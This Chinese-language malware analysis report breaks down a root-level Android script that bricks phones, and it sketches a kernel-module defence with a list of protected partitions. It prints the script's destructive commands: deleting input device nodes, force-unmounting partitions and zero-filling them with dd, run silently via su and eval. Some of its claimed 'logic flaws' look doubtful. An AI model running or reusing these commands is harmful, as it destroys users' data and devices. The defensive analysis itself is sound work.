# 恶意Android脚本分析报告

## 脚本概述

这是一个极其危险的Android恶意脚本，主要目的是擦除设备上的所有存储分区，造成设备完全损坏（"砖机"）。

## 脚本分析

### 隐匿性技术

1. **输出重定向隐匿**
   ```bash
   exec >/dev/null 2>&1
   ```
   - 将所有标准输出和错误输出重定向到 `/dev/null`
   - 使脚本执行过程完全静默，用户无法察觉

2. **工具别名伪装**
   ```bash
   for c in `toybox`
   do
   alias $c=/system/bin/toybox\ $c
   done
   ```
   - 为所有toybox命令创建别名
   - 可能用于绕过某些安全检测机制

3. **间接执行**
   ```bash
   export variable=`main`
   /system/bin/su -c 'eval "$variable"'
   ```
   - 将恶意代码存储在变量中，然后通过eval执行
   - 增加静态分析的难度

### 攻击机制

#### 1. 输入设备破坏
```bash
rm -f /dev/input/*
```
- 删除所有输入设备节点
- 导致触摸屏、按键等输入设备失效
- 阻止用户中断攻击过程

#### 2. 分区发现与过滤
```bash
tail -n +2 /proc/partitions | grep -E sd*\|mmcblk*
```
- 从 `/proc/partitions` 获取所有存储设备信息
- 过滤出SD卡和eMMC设备
- 跳过第一行标题

#### 3. 分区大小过滤逻辑漏洞
```bash
d=`echo $a | awk '{print $3}'`
[ ${#d} -gt 6 ] || [ $d -gt 307200 ] && continue
```
**逻辑漏洞分析：**
- 条件：分区名长度>6字符 OR 分区大小>307200KB (300MB)
- **漏洞1**: 使用字符串长度判断而非数值比较
- **漏洞2**: 307200KB阈值过小，会跳过大分区但攻击小分区
- **漏洞3**: 逻辑运算符使用错误，应该用 `&&` 而非 `||`

#### 4. 设备节点重建与擦除
```bash
b=/dev/block/`echo $a | awk '{print $4}'`
umount -f $b
rm -f $b
mknod $b b `echo $a | awk '{print $1}'` `echo $a | awk '{print $2}'`
blockdev --setrw $b
chmod 0600 $b
dd if=/dev/zero of=$b
```
- 强制卸载分区
- 删除并重建设备节点
- 设置为读写模式
- 使用dd命令用零填充整个分区

#### 5. 并行执行
```bash
{ ... } &
```
- 所有擦除操作在后台并行执行
- 加速攻击过程，难以中断

## 危险性评估

### 高危险性
- **数据完全丢失**: 擦除所有用户数据和系统分区
- **设备无法启动**: 破坏bootloader和系统分区
- **硬件损坏风险**: 可能损坏关键固件分区
- **无法恢复**: 一旦执行，设备基本无法修复

### 攻击目标分区
脚本会攻击所有检测到的存储分区，包括但不限于：
- 用户数据分区 (userdata)
- 系统分区 (system)
- 启动分区 (boot)
- 恢复分区 (recovery)
- 固件分区 (各种bootloader分区)

## 防护策略

### 1. 敏感分区保护列表
需要特别保护的关键分区：
- `persist`, `vm-persist` - 持久化数据
- `modem_a`, `modem_b` - 基带固件
- `modemst1`, `modemst2` - 基带配置
- `fsg`, `fsc` - 文件系统配置
- `abl_a`, `abl_b` - Android Bootloader
- `featenabler_a`, `featenabler_b` - 功能启用器
- `xbl_*` - 扩展Bootloader相关分区
- `vendor_boot_a`, `vendor_boot_b` - 厂商启动分区
- `ocdt` - 设备配置表

### 2. 检测点
- 监控 `dd` 命令执行
- 检测对 `/dev/block/*` 的写操作
- 监控 `mknod` 创建块设备
- 检测 `umount -f` 强制卸载

### 3. 用户交互机制
- 音量键确认机制
- 5秒超时自动拒绝
- 敏感分区自动拒绝

## 技术实现要点

### KPM模块需要实现的功能
1. **系统调用拦截**: Hook `sys_write`, `sys_openat` 等
2. **命令行解析**: 检测dd命令及其参数
3. **分区识别**: 识别目标分区是否为敏感分区
4. **用户交互**: 实现音量键监听和超时机制
5. **日志记录**: 记录所有拦截事件

### 关键挑战
- 内核空间用户交互实现
- 音量键事件在内核层的捕获
- 系统调用hook的稳定性
- 性能影响最小化

## 结论

这个恶意脚本利用了Android系统的root权限和设备节点访问机制，通过巧妙的隐匿技术和并行执行，能够在短时间内完全破坏设备。其逻辑漏洞主要在分区过滤算法上，但这并不能降低其危险性。

开发KPM防护模块是必要的，需要在内核层面拦截危险操作，并提供用户确认机制来防止此类攻击。